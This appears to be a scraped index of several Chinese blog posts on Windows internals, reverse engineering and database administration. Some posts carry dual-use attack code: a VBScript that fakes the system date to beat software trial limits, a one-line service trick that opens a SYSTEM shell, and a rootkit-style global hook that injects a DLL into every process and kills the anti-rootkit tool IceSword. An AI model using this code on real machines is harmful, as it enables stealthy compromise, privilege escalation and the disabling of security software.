----------- ------------------------------user_dump_dest string /u01/app/diag/rdbms/orcl/orcl/traceSQL&gt; show parameter max_dump_file_size;NAME TYPE VALUE------------------------------------ ----------- ------------------------------max_dump_file_size string unlimited 4. trc 文件分析方法(1) 可以使用trc2sql.pl 来提取trc文件中的SQL语句 下载地址: https://gist.github.com/henices/5097678 方法(2) oracle提供tkprof 命令可以解析trc文件，使用方法为： 1$ tkprof tracefile outputfile 参考链接参考链接： http://www.eygle.com/case/Use.sql_trace.to.Diagnose.database.htm","link":"/cn/oracle_statement_trace/"},{"title":"Linux 下运行 IDA Pro","text":"IDA Pro 6.2 + 的Linux 版本提供了Qt 界面，可以在各大平台正常运行。买不起也有办法 ，使用 wine 可以很好地运行IDA Pro，显示效果基本OK，爱折腾的同学可以自行调整字体。 1$ wine idag.exe IDA Pro 6.1 成功运行.但是idapython 有些问题需要处理，引起idapython不能正常运行的原因主要有下面两个： 文件缺失大概会报下面错误 1err:module:import_dll Library python27.dll (which is needed by L&quot;C:\\\\ida61\\\\plugins\\\\python.plw&quot;) not found 要解决这个错误，需要从windows下拷贝两个文件过来，这两个文件是 msvcr90.dll，python27.dll 环境变量1$ wine idag.exe 会报下面类似错误， ImportError: No module named site，发生这个错误的原因是找不到python安装路径，可以使用unix下的python使用shell命令设置环境变量 12$ export PYTHONPATH=/usr/lib/python2.7/$ wine idag.exe Python 问题在使用过程中发现idapython还是有一些问题，使用wine安装Windows的python后问题得到解决，主要是C语言写的python模块的问题。 参考链接http://www.openrce.org/forums/posts/463","link":"/cn/linux_ida_pro/"},{"title":"破解软件时间限制的程序","text":"1234567891011Dim daytimedaytime = formatdatetime(now(), 2)wscript.echo &quot;Now is: &quot; &amp; daytimewscript.echo &quot;Change system data to 2010/12/18...&quot;Set os =WScript.CreateObject(&quot;WScript.Shell&quot;)os.run &quot;cmd /c date 2010/12/18&quot;, 0, Truewscript.sleep 3000wscript.echo &quot;Call some.exe&quot;os.run &quot;.\\some.exe&quot;, 1, Truewscript.echo &quot;Restore system data to &quot; &amp; daytimeos.run &quot;cmd /c date &quot; &amp; daytime, 0, True","link":"/cn/crack_time_limit_software/"},{"title":"获取system权限的cmdshell","text":"12sc Create SuperCMD binPath=&quot;cmd /K start&quot; type=own type=interactsc start SuperCMD","link":"/cn/get_system_shell_windows/"},{"title":"SQL Server 2005 xp_cmdshell","text":"SQL Server 2005 中引入的 xp_cmdshell 选项是服务器配置选项，使系统管理员能够控制是否可以在系统上执行 xp_cmdshell 扩展存储过程。 1. 如何在sql server 2005 中开启xp_cmdshell123456789101112-- To allow advanced options to be changed.EXEC sp_configure 'show advanced options', 1GO-- To update the currently configured value for advanced options.RECONFIGUREGO-- To enable the feature.EXEC sp_configure 'xp_cmdshell', 1GO-- To update the currently configured value for this feature.RECONFIGUREGO 2. 如何查询sql server 2005 拓展存储过程xp_cmdshell 状态12SELECT * FROM sys.configurations where name='xp_cmdshell'GO 查看value的值， 1 为开启， 0 为关闭 3. 如何查看public角色对哪些拓展存储过程有执行权限123456select sysusers.name, sysobjects.name, sysprotects.action from sysobjects, sysusers, sysprotectswhere sysobjects.id=sysprotects.id and sysprotects.uid = sysusers.uid and sysprotects.protecttype=205 and sysprotects.action= 224 and (sysusers.name='public' orsysusers.name='guest' ) and sysobjects.type='X'GO 4. 如何去掉public角色对拓展存储过程的执行权限12deny execute on xp_dirtree to publicGO","link":"/cn/sqlserver2005_xpcmdshell/"},{"title":"挂钩 NtResumeThread 实现全局Hook","text":"挂钩一直是Hack 编程中永恒的主题，基本高级的Rootkit 程序多多少少都会使用Hook 技术。似乎Hook 都被讲烂了，不论是Ring3 的还是Ring0 的网上都有例子。Ring0 的毋庸置疑当然是全局的了，这里说说ring3 的全局hook。Ring 3 有Ring 3 的优势，稳定是压倒一切的，因此Mcafee 和其他一些商业的安全软件都还是使用了Ring3 的Hook 技术，无论如何用户是无法接受蓝屏和死机的。 感兴趣的可以装个Rootkit unhooker 自己看看。 :) 1. 以往的Ring 3全局Hook纵观网上流行的全局Hook 程序都只用了一个Windows API， SetWindowsHookEx，此函数原型： 123456HHOOK SetWindowsHookEx( int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId); 1234idhook 安装的钩子类型，如 WH_GETMESSAGE，WH_KEYBOARD 等lpfn hook procedure 的指针hmod 包含 hook procedure DLL 的handledwThread 为0 使用这个这个API 时候有问题的，只能挂接系统中的所有G U I线程，换句通俗的话说就是有界面的程序，Windows console 类的程序就无能为力了。 还有一种通过插入注册表来实现 1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 这种方法简单，但是还是只能挂钩GUI 程序，并且这个键值已经被广大HIPS 所关注，吃力不讨好。 以上两种效果不好，因此有人有开始另外的做法，枚举所有进程，插入和挂钩 NtCreateProcess这是非常自然的想法，似乎也把问题解决了，但是仔细思考一下，就会发现很多问题。 a. 时机不对，在NtCreateProcess函数被调用时进程并没有真正被创建，我们无法执行HOOK操作， 而当NtCreateProcess返回时，进程又已经开始运行 b. 如果是Windows console 创建的进程，你如何去监控这个调用呢？这么说似乎比较抽象，你可 以这么理解，直接在命令行下，cmd，cmd，cmd …. 你可以监控到最后一个cmd 吗，如果只 用SetWindowsHookEx c. 是否正好站在了华容道，是否足够底层。 似乎很费劲 2. 分析系统创建进程过程，寻找方法关于这方面内容，可以参考毛德操老师的两篇文章 《漫谈兼容内核之十七:再谈Windows的进程创建》《漫谈兼容内核之二十二:Windows线程的调度和运行》 下面是他的blog 链接：http://hi.baidu.com/fatbsd/blog CreateProcess 是 Kernel32.dll 的导出函数。 操起WinDbg，剁了一下： Windows 2003 SP2 12345678910111213141516171819202122232425262728lkd&gt; uf CreateProcessWkernel32!CreateProcessW:7c802474 8bff mov edi,edi7c802476 55 push ebp7c802477 8bec mov ebp,esp7c802479 6a00 push 0x07c80247b ff752c push dword ptr [ebp+0x2c]7c80247e ff7528 push dword ptr [ebp+0x28]7c802481 ff7524 push dword ptr [ebp+0x24]7c802484 ff7520 push dword ptr [ebp+0x20]7c802487 ff751c push dword ptr [ebp+0x1c]7c80248a ff7518 push dword ptr [ebp+0x18]7c80248d ff7514 push dword ptr [ebp+0x14]7c802490 ff7510 push dword ptr [ebp+0x10]7c802493 ff750c push dword ptr [ebp+0xc]7c802496 ff7508 push dword ptr [ebp+0x8]7c802499 6a00 push 0x07c80249b e8a6ac0200 call kernel32!CreateProcessInternalW (7c82d146)7c8024a0 5d pop ebp7c8024a1 c22800 ret 0x28lkd&gt; uf CreateProcessInternalW....7c82cf8f ff159814807c call dword ptr [kernel32!_imp__NtCreateProcessEx (7c801498)]....7c82daa2 ff159414807c call dword ptr [kernel32!_imp__NtCreateThread (7c801494)]....7c82dbdc ff158814807c call dword ptr [kernel32!_imp__NtResumeThread (7c801488)] 大概流程如下: 12345Kernel32!CreateProcessWKernel32!CreateProcessInternalWntdll!NtCreateProcessExntdll!NtCreateThreadntdll!NtResumeThread 因为进程创建后，Windows 必须为它创建一个主线程，然后等待操作系统调度它。所以调用NtResumeThread的时候，就是我们Hook的最佳时机，因为此时创建进程的主要工作已经完成，但是进程并没有调度起来，呵呵，方便干坏事啊。 3. 具体代码实现基本思路已经清晰了，这里还几个问题。 a. NtResumeThread 函数并不是创建进程才调用，我们怎么区分出哪个是创建进程时 调用的NtResumeThread呢？ 其实现实起来不困难，先枚举系统进程一次，将系统进程中NtResumeThread 都挂钩上。每次拦截到NTResumeThread 是判断NtResumeThread 的头几个字节是否已经被修改，如果没有则是创建新进程的调用。 b. 用什么方法Hook ， IAT、Inline？ 总的架构？ 这种代码写起来还是Inline Hook 来的舒服，修改函数调用头几个字节。 枚举系统所有进程是不可避免的，因此要写个loader 将我们编写的DLL 插入系统所有进程。发现有进进程 创建时，将DLL 插入新进程。 下面代码演示，Hook NtQuerySystemInformation，因为篇幅等原因只有整体框架和关键代码。 Hook 也不是不是我们这次的主要内容，感兴趣的可以参考 http://www.xfocus.net/articles/200403/681.html c. 在多线程的环境下是否可靠？ 使用关键代码段，互斥锁，效果还可以。 Loader： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980void inject(HANDLE hProcess){char CurPath[256] = {0}; strcpy(CurPath, &quot;C:\\\\WINDOWS\\\\system32\\\\Hook.dll&quot;); PWSTR pszLibFileRemote = NULL; int len = (lstrlen(CurPath)+1)*2; WCHAR wCurPath[256]; MultiByteToWideChar(CP_ACP,0,CurPath,-1,wCurPath,256); pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID) wCurPath, len, NULL); PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;); CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);}void TotalInject(){ HANDLE hProcessSnap = NULL; BOOL bRet = FALSE; PROCESSENTRY32 pe32 = {0}; // Take a snapshot of all processes in the system. EnableDebugPrivilege(1); hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) return; // Fill in the size of the structure before using it. pe32.dwSize = sizeof(PROCESSENTRY32); // Walk the snapshot of the processes, and for each process, // display information. if (Process32First(hProcessSnap, &amp;pe32)) { do { HANDLE hProcess; // Get the actual priority class. hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID); inject(hProcess); CloseHandle(hProcess); } while (Process32Next(hProcessSnap, &amp;pe32)); } // Do not forget to clean up the snapshot object. EnableDebugPrivilege(0); CloseHandle (hProcessSnap); return ;} Hook.dll: 关键代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;BOOL g_bHook = FALSE;typedef LONG NTSTATUS;#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)typedef ULONG SYSTEM_INFORMATION_CLASS;typedef ULONG THREADINFOCLASS;typedef ULONG PROCESSINFOCLASS;typedef ULONG KPRIORITY;#define MEMORY_BASIC_INFORMATION_SIZE 28typedef struct _THREAD_BASIC_INFORMATION { NTSTATUS ExitStatus; PNT_TIB TebBaseAddress; CLIENT_ID ClientId; KAFFINITY AffinityMask; KPRIORITY Priority; KPRIORITY BasePriority;} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;typedef struct _PROCESS_BASIC_INFORMATION { // Information Class 0NTSTATUS ExitStatus;PVOID PebBaseAddress;KAFFINITY AffinityMask;KPRIORITY BasePriority;ULONG UniqueProcessId;ULONG InheritedFromUniqueProcessId;} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;typedef NTSTATUS (__stdcall *NTQUERYSYSTEMINFORMATION)( IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL );typedef NTSTATUS (__stdcall *NTRESUMETHREAD)(IN HANDLE ThreadHandle,OUT PULONG PreviousSuspendCount OPTIONAL);typedef NTSTATUS (__stdcall *NTQUERYINFORMATIONTHREAD)( IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength OPTIONAL);typedef NTSTATUS (__stdcall * NTQUERYINFORMATIONPROCESS)(IN HANDLE ProcessHandle,IN PROCESSINFOCLASS ProcessInformationClass,OUT PVOID ProcessInformation,IN ULONG ProcessInformationLength,OUT PULONG ReturnLength OPTIONAL);NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = NULL;NTRESUMETHREAD g_pfNtResumeThread = NULL;BYTE g_OldNtQuerySystemInformation[5] = {0}, g_NewNtQuerySystemInformation[5] = {0};BYTE g_OldNtResumeThread[5] = {0}, g_NewNtResumeThread[5] = {0};DWORD dwIdOld = 0;CRITICAL_SECTION cs;NTSTATUS __stdcall NewNtQuerySystemInformation( IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength);NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,OUT PULONG PreviousSuspendCount OPTIONAL);void WINAPI HookOn();void WINAPI HookOff();BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { InitializeCriticalSection(&amp;cs); char Name[MAX_PATH] = {0}; GetModuleFileName(NULL, Name, MAX_PATH); // 杀杀冰刃玩玩 if ( strstr(Name, &quot;IceSword.exe&quot;) != NULL) { HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId()); TerminateProcess(hProcess, 0); CloseHandle(hProcess); } if(!g_bHook) { HookOn(); } #ifdef _DEBUG MessageBox(NULL, &quot;Process Attach&quot;, &quot;Remote Dll&quot;, MB_OK); #endif } break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: if(g_bHook) { HookOff();#ifdef _DEBUG MessageBox(NULL, &quot;Off!&quot;, &quot;Hook Off&quot;, MB_OK);#endif DeleteCriticalSection(&amp;cs); } break; } return TRUE;}BOOL EnableDebugPrivilege(BOOL fEnable) { // Enabling the debug privilege allows the application to see // information about service applications BOOL fOk = FALSE; // Assume function fails HANDLE hToken; // Try to open this process's access token if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) { // Attempt to modify the &quot;Debug&quot; privilege TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); } return(fOk);}#define ThreadBasicInformation 0void inject(HANDLE hProcess){ char CurPath[256] = {0}; GetSystemDirectory(CurPath, 256); strncat(CurPath, &quot;\\\\Hook.dll&quot;, 9); //strcpy(CurPath, &quot;C:\\\\WINDOWS\\\\system32\\\\Hook.dll&quot;); PWSTR pszLibFileRemote = NULL; int len = (lstrlen(CurPath)+1)*2; WCHAR wCurPath[256]; MultiByteToWideChar(CP_ACP,0,CurPath,-1,wCurPath,256); EnableDebugPrivilege(1); pszLibFileRemote = (PWSTR) VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID) wCurPath, len, NULL); PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;); HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL); WaitForSingleObject(hRemoteThread, INFINITE); CloseHandle(hRemoteThread); EnableDebugPrivilege(0);}NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,OUT PULONG PreviousSuspendCount OPTIONAL){ NTSTATUS ret; NTSTATUS nStatus; NTQUERYSYSTEMINFORMATION NtQuerySystemInformation; NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL; THREAD_BASIC_INFORMATION ti; DWORD Pid = 0; HMODULE hNtdll = GetModuleHandle(&quot;ntdll.dll&quot;); NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;); NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, &quot;NtQueryInformationThread&quot;); if (NtQueryInformationThread == NULL) {#ifdef _DEBUG MessageBox(NULL, &quot;can't get NtQueryInformationThread&quot;, &quot;&quot;, MB_OK);#endif } nStatus = NtQueryInformationThread(ThreadHandle, ThreadBasicInformation, (PVOID)&amp;ti, sizeof(THREAD_BASIC_INFORMATION), NULL); if(nStatus != STATUS_SUCCESS) {#ifdef _DEBUG MessageBox(NULL, &quot;fuck failed&quot;, &quot;&quot;, MB_OK);#endif } Pid = (DWORD)(ti.ClientId.UniqueProcess); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid); if (hProcess == NULL) {#ifdef _DEBUG MessageBox(NULL, &quot;open process failed&quot;, &quot;&quot;, MB_OK);#endif } BYTE FirstByte[1] = {0}; // check if the process has been hooked ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, 1, NULL); // 已经被Hook了 if ( FirstByte[0] == 0xe9) { HookOff(); ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount); HookOn(); CloseHandle(hProcess); return ret; } // 创建新进程的调用，Hook 之 else { HookOff(); inject(hProcess); ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount); HookOn(); CloseHandle(hProcess); return ret; }}NTSTATUS __stdcall NewNtQuerySystemInformation( IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength){ NTSTATUS ntStatus; HookOff(); ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength); HookOn(); return ntStatus;}void WINAPI HookOn(){ PMEMORY_BASIC_INFORMATION lpAllocBuffer = NULL; DWORD dwOldProtect, dwOldProtect2; HANDLE hProcess = NULL; dwIdOld = GetCurrentProcessId(); hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwIdOld); if(hProcess == NULL) return ; HMODULE hNtdll = GetModuleHandle(&quot;ntdll.dll&quot;); g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;); if (g_pfNtQuerySystemInformation == NULL) { return; } g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, &quot;NtResumeThread&quot;); if (g_pfNtResumeThread == NULL) { return; } EnterCriticalSection(&amp;cs); _asm { lea edi,g_OldNtQuerySystemInformation mov esi,g_pfNtQuerySystemInformation cld mov ecx,5 rep movsb lea edi,g_OldNtResumeThread mov esi,g_pfNtResumeThread cld mov ecx,5 rep movsb } g_NewNtQuerySystemInformation[0] = 0xe9; g_NewNtResumeThread[0] = 0xe9; _asm { lea eax, NewNtQuerySystemInformation mov ebx, g_pfNtQuerySystemInformation sub eax, ebx sub eax, 5 mov dword ptr [g_NewNtQuerySystemInformation + 1], eax lea eax, NewNtResumeThread mov ebx, g_pfNtResumeThread sub eax, ebx sub eax, 5 mov dword ptr [g_NewNtResumeThread + 1], eax } ....... LeaveCriticalSection(&amp;cs); g_bHook = TRUE;}// 还原被修改的代码void WINAPI HookOff(){ ...... g_bHook = FALSE;} 4. 参考资料Microsoft MSDN，SDK &amp; DDK《Windows NT 2000 Native API Reference》《Windows 核心编程》《挂钩Windows API》《如何在Windows NT中隐藏自己》","link":"/cn/hook_ntResume/"},{"title":"int 2eh 方式调用Native api","text":"小技巧。但是用的人好像不多。例子： Windows 2000 下 123456789101112131415161718NtQuerySystemInformationNo = 0x97;_declspec(naked)NTSTATUS __stdcall PrivateNtQuerySystemInformation (IN SYSTEM_INFORMATION_CLASS, IN OUT PVOID, IN ULONG, OUT PULONG OPTIONAL){ _asm { mov eax, NtQuerySystemInformationNo lea edx, [esp+4] int 2Eh ret 10h }}","link":"/cn/int23_native_api/"},{"title":"联想 IBM THINKPAD T60装windows 2003&#x2F;2008红外线设备驱动解决","text":"Intel(R) 82801GBM (ICH7-M) LPC Interface Controller - 27B9（ACPI\\IBM0071\\4&amp;61F3B4B&amp;0）是Intel的红外线设备连接。 win2003/2008等服务器版本没有自带这个驱动。IBM T60等机器可以在主板里设置关闭INTERFACE，或者下载XP的红外线补丁（IBM Thinkpad Fast Infrared Port）就可以解决 相关链接：http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&amp;lndocid=MIGR-4KUR6Shttp://www.versiontracker.com/dyn/moreinfo/win/36353http://www.soft32.com/download_181790.htmlhttp://forum.thinkpads.com/viewtopic.php?t=22787&amp;sid=3a24f025ddb4d19d3e2d00e122c84957 具体解决办法： 第一方法：BIOS设置： Config(设置)选项—Infrared(红外线接口)选项,设为禁用(Disable)Config(设置)选项—Infrared Device(红外线设备)选项,设为禁用(Hidden) 第二方法：下载红外补丁后按下列方法安装：1、解压压缩包，并执行instirda.bat，然后重新启动计算机；2、插入USB红外线设备（笔记本自带红外的看第3步）；3、察看设备管理器，会发现网络适配器处多出一项带叹号的USB Device的项目；4、选择此项目，更新驱动（可用WinXP下的驱动程序）；5、运行reg\\Infrared，导入注册表；6、设备管理器中找到那个设备，更新驱动——不要搜索，我要自己选择安装的驱动——IBM thinkpad fast infrared port，然后下一步；7、提示所需文件——找到sys里面的nscirda；8、成功。 已知问题：1、安装过程中可能，系统提示个别文件无法找到，请手动定位到前面已解压的SYS文件夹处，确认继续。2、使用红外设备后，提示缺文件也是要定位到SYS文件夹进行安装。3、要是提示不能识别，可以重新更新驱动 Windows server 2003（企业版）红外通讯支持程序（Fro 2003 红外驱动） 下载地址： http://www.irxon.com/download/ir2003.ziphttp://www.divshare.com/download/4167497-cb3 说明：Windows server 2003 （企业版）是一款面向企业用户的高端服务器操作系统，为了安全起见，它没有集成支持IrDA红外通讯的协议软件，所以目前所有的IrDA红外设备都不能在这个操作系统里使用。但是我们可以利用XP系统里的IrDA红外通讯协议软件来解决这个问题,安装时使用红外适配器在XP系统里的驱动程序，缺协议软件就到这个软件包里去找，安装完成后红外适配器就可以在Windows2003里正常工作了。 PS: T60 装了2003 后一个驱动老是找不到，最后终于找到了正确答案。。：） share it","link":"/cn/T60_device/"},{"title":"ring3 下挂钩Native API 简单实现文件防删除","text":"简单实现文件防删除，说简单是因为没有用很底层的技术，例如文件驱动之类。我只用最简单的方法实现了, 使用 ring3 的API hook 技术。随着技术的发展这种技术已经过不了很多的主动防御技术了。主要是思路和方法和分析过程。(高手飘过) ring3 下挂钩 API 基本上也就是修改导入表，和Inline hook 修改前5个字节这几种方法。挂钩Native API 没有什么区别，也就是多声明几个结构和变量类型。 关于挂钩API 请参见：www.xfocus.net/articles/200403/681.html 文件删除的ring3 API 是DeleteFile, 此API 存在于kernel32.dll 中，用OD分析一下。(哪个都可以，IDA更不用说) DeleteFileA 的反汇编代码： 12345678910117C80D2FB &gt;/$ 8BFF mov edi, edi7C80D2FD |. 55 push ebp7C80D2FE |. 8BEC mov ebp, esp7C80D300 |. FF75 08 push dword ptr [ebp+8]7C80D303 |. E8 17790100 call 7C824C1F7C80D308 |. 85C0 test eax, eax7C80D30A |. 74 08 je short 7C80D3147C80D30C |. FF70 04 push dword ptr [eax+4] ; /FileName7C80D30F |. E8 3D170000 call DeleteFileW ; \\DeleteFileW7C80D314 |&gt; 5D pop ebp7C80D315 \\. C2 0400 retn 4 可以得到一个流程 DeleteFileA –&gt; DeleteFileW DeleteFileW 的反汇编代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192937C80EA51 &gt; $ 8BFF mov edi, edi7C80EA53 . 55 push ebp7C80EA54 . 8BEC mov ebp, esp7C80EA56 . 83EC 50 sub esp, 507C80EA59 . 56 push esi7C80EA5A . 8D45 C8 lea eax, dword ptr [ebp-38]7C80EA5D . 50 push eax7C80EA5E . 33F6 xor esi, esi7C80EA60 . 56 push esi7C80EA61 . 8D45 E0 lea eax, dword ptr [ebp-20]7C80EA64 . 50 push eax7C80EA65 . FF75 08 push dword ptr [ebp+8]7C80EA68 . C645 FF 00 mov byte ptr [ebp-1], 07C80EA6C . FF15 5411807C call dword ptr [&lt;&amp;ntdll.RtlDosPathNam&gt;; ntdll.RtlDosPathNameToRelativeNtPathName_U7C80EA72 . 84C0 test al, al7C80EA74 . 0F84 FBCC0200 je 7C83B7757C80EA7A . 8B45 E4 mov eax, dword ptr [ebp-1C]7C80EA7D . 8945 F4 mov dword ptr [ebp-C], eax7C80EA80 . 8B45 C8 mov eax, dword ptr [ebp-38]7C80EA83 . 66:3BC6 cmp ax, si7C80EA86 . 0F85 E9660200 jnz 7C8351757C80EA8C . 8975 D0 mov dword ptr [ebp-30], esi7C80EA8F &gt; 8B45 D0 mov eax, dword ptr [ebp-30]7C80EA92 . 53 push ebx7C80EA93 . 57 push edi7C80EA94 . 8945 B4 mov dword ptr [ebp-4C], eax7C80EA97 . 8D45 E0 lea eax, dword ptr [ebp-20]7C80EA9A . 8945 B8 mov dword ptr [ebp-48], eax7C80EA9D . BF 40402000 mov edi, 2040407C80EAA2 . 57 push edi7C80EAA3 . 6A 07 push 77C80EAA5 . 8D45 E8 lea eax, dword ptr [ebp-18]7C80EAA8 . 50 push eax7C80EAA9 . 8D45 B0 lea eax, dword ptr [ebp-50]7C80EAAC . 50 push eax7C80EAAD . 68 80000100 push 10080 ; UNICODE &quot;ocuments and7C80EAB2 . 8D45 F8 lea eax, dword ptr [ebp-8]7C80EAB5 . 8975 C0 mov dword ptr [ebp-40], esi7C80EAB8 . 8975 C4 mov dword ptr [ebp-3C], esi7C80EABB . 8B35 1410807C mov esi, dword ptr [&lt;&amp;ntdll.NtOpenFi&gt;; ntdll.ZwOpenFile7C80EAC1 . 50 push eax7C80EAC2 . C745 B0 18000&gt;mov dword ptr [ebp-50], 187C80EAC9 . C745 BC 40000&gt;mov dword ptr [ebp-44], 407C80EAD0 . FFD6 call esi ; &lt;&amp;ntdll.NtOpenFile&gt;7C80EAD2 . 8BD8 mov ebx, eax7C80EAD4 . 85DB test ebx, ebx7C80EAD6 .^ 0F8C F5F4FFFF jl 7C80DFD17C80EADC . 6A 23 push 23 ; /InfoClass = FileAttributeTagInformation7C80EADE . 6A 08 push 8 ; |Bufsize = 87C80EAE0 . 8D45 D8 lea eax, dword ptr [ebp-28] ; |7C80EAE3 . 50 push eax ; |Buffer7C80EAE4 . 8D45 E8 lea eax, dword ptr [ebp-18] ; |7C80EAE7 . 50 push eax ; |pStatusBlock7C80EAE8 . FF75 F8 push dword ptr [ebp-8] ; |hFile7C80EAEB . FF15 1810807C call dword ptr [&lt;&amp;ntdll.NtQueryInform&gt;; \\ZwQueryInformationFile7C80EAF1 . 8BD8 mov ebx, eax7C80EAF3 . 85DB test ebx, ebx7C80EAF5 . 0F8C D5CC0200 jl 7C83B7D07C80EAFB . 8B45 D8 mov eax, dword ptr [ebp-28]7C80EAFE . 25 00040000 and eax, 4007C80EB03 . 0F85 0ECD0200 jnz 7C83B8177C80EB09 &gt; 85C0 test eax, eax7C80EB0B . 0F85 1CCD0200 jnz 7C83B82D7C80EB11 &gt; 8D45 C8 lea eax, dword ptr [ebp-38]7C80EB14 . 50 push eax7C80EB15 . FF15 5011807C call dword ptr [&lt;&amp;ntdll.RtlReleaseRel&gt;; ntdll.RtlReleaseRelativeName7C80EB1B . FF75 F4 push dword ptr [ebp-C]7C80EB1E . 64:A1 1800000&gt;mov eax, dword ptr fs:[18]7C80EB24 . 8B40 30 mov eax, dword ptr [eax+30]7C80EB27 . 6A 00 push 07C80EB29 . FF70 18 push dword ptr [eax+18]7C80EB2C . FF15 1010807C call dword ptr [&lt;&amp;ntdll.RtlFreeHeap&gt;] ; ntdll.RtlFreeHeap7C80EB32 . 6A 0D push 0D ; /InfoClass = FileDispositionInformation7C80EB34 . 6A 01 push 1 ; |Bufsize = 17C80EB36 . 8D45 0B lea eax, dword ptr [ebp+B] ; |7C80EB39 . 50 push eax ; |Buffer7C80EB3A . 8D45 E8 lea eax, dword ptr [ebp-18] ; |7C80EB3D . 50 push eax ; |pStatusBlock7C80EB3E . FF75 F8 push dword ptr [ebp-8] ; |hFile7C80EB41 . C645 0B 01 mov byte ptr [ebp+B], 1 ; |7C80EB45 . FF15 3010807C call dword ptr [&lt;&amp;ntdll.NtSetInformat&gt;; \\ntdll.ZwSetInformationFile7C80EB4B . FF75 F8 push dword ptr [ebp-8] ; /Handle7C80EB4E . 8BF0 mov esi, eax ; |7C80EB50 . FF15 3810807C call dword ptr [&lt;&amp;ntdll.NtClose&gt;] ; \\ZwClose7C80EB56 . 85F6 test esi, esi7C80EB58 .^ 0F8C 1F91FFFF jl 7C807C7D7C80EB5E . 33C0 xor eax, eax7C80EB60 . 40 inc eax7C80EB61 &gt; 5F pop edi7C80EB62 . 5B pop ebx7C80EB63 &gt; 5E pop esi7C80EB64 . C9 leave7C80EB65 . C2 0400 retn 4 得到一个流程 DeleteFileA –&gt; DeleteFileW –&gt; ntdll.ZwSetInformationFile，因此我们只要挂钩了ZwSetInformationFile 就可以简单实现目标了。这里写出了新的 ZwSetInformationFile 函数。 